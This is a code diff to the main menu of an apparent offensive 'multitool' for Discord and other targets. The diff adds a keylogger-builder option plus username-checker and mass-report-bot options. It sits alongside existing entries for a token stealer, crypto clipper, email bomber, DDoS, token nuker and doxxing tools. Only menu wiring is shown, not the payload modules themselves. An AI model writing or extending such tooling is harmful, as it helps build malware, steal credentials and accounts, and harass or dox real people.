@@ -1,3 +1,13 @@
+#  _   _                 _ 
+# | \ | |               (_)
+# |  \| | __ ___   __ _  _ 
+# | . ` |/ _` \ \ / /(_)| |
+# | |\  | (_| |\ V /  _ | |
+# |_| \_|\__,_| \_/  (_)|_|
+# 
+# Navi Multitool - Developed by glockinhand
+# GitHub: https://github.com/glockinhand/navi-multitool
+
 import sys, time, subprocess, json, os, threading
 
 def _init():
@@ -91,7 +101,7 @@ def run_app():
         _cl = Theme.get_colors()
         print_banner()
         print(Colorate.Horizontal(_cl["head"], "    [ DISCORD ]              [ OSINT ]                [ MALICIOUS ]"))
-        _d = [("[1] Webhook Tools", "[10] Port Scanner", "[20] Email Bomber"),("[2] Token Tools", "[11] Whois Lookup", "[21] Crypto Clipper"),("[3] Nitro Generator", "[12] DNS Lookup", "[22] Vuln Scanner"),("[4] Server Info", "[14] Dox Tracker", "[23] DDoS Attack"),("[5] Bot Invite Gen", "[15] Dox Creator", "[24] Navi Stealer"), ("[6] Selfbot", "[16] Phone Lookup", ""), ("", "[17] Email Lookup", "")]
+        _d = [("[1] Webhook Tools", "[10] Port Scanner", "[20] Email Bomber"),("[2] Token Tools", "[11] Whois Lookup", "[21] Crypto Clipper"),("[3] Nitro Generator", "[12] DNS Lookup", "[22] Vuln Scanner"),("[4] Server Info", "[14] Dox Tracker", "[23] DDoS Attack"),("[5] Bot Invite Gen", "[15] Dox Creator", "[24] Navi Stealer"), ("[6] Selfbot", "[16] Phone Lookup", "[25] Keylogger Builder"), ("", "[17] Email Lookup", "")]
 
 
         for _r1, _r2, _r3 in _d:
@@ -118,7 +128,7 @@ def run_app():
             while 1:
                 print_banner()
                 print(Colorate.Horizontal(_cl["head"], "  [ TOKEN & ACCOUNT TOOLS ]\n"))
-                menu_opts({"1": "ID to Token", "2": "Token Info", "3": "Token Nuker", "4": "Token Login", "5": "Status Rotator", "6": "Token Onliner", "7": "Selfbot", "99": "Return"})
+                menu_opts({"1": "ID to Token", "2": "Token Info", "3": "Token Nuker", "4": "Token Login", "5": "Status Rotator", "6": "Token Onliner", "7": "Selfbot", "8": "Username Checker", "9": "Report Bot", "99": "Return"})
                 _cc = get_inpt("navi@discord/tokens:~#")
                 if _cc == "1":
                     _uid = get_inpt("UID:")
@@ -142,6 +152,12 @@ def run_app():
                 elif _cc == "7":
                     from modules.discord_tools import selfbot_menu
                     selfbot_menu()
+                elif _cc == "8":
+                    from modules.discord_tools import discord_username_checker
+                    discord_username_checker(int(get_inpt("Threads (1):") or 1))
+                elif _cc == "9":
+                    from modules.discord_tools import discord_report_bot
+                    discord_report_bot()
                 elif _cc == "99": break
         elif _c == "6":
             from modules.discord_tools import selfbot_menu
@@ -196,6 +212,9 @@ def run_app():
         elif _c == '24':
             from modules.recovery_builder import build_navi_recovery
             build_navi_recovery()
+        elif _c == '25':
+            from modules.keylogger import build_keylogger
+            build_keylogger()
         elif _c == '30':
             _m, _t = get_inpt("(E/D):").upper(), get_inpt("Text:")
             try: print(Colorate.Horizontal(_cl["head"], f"  Res: {CryptXer.b64_e(_t) if _m == 'E' else CryptXer.b64_d(_t)}"))
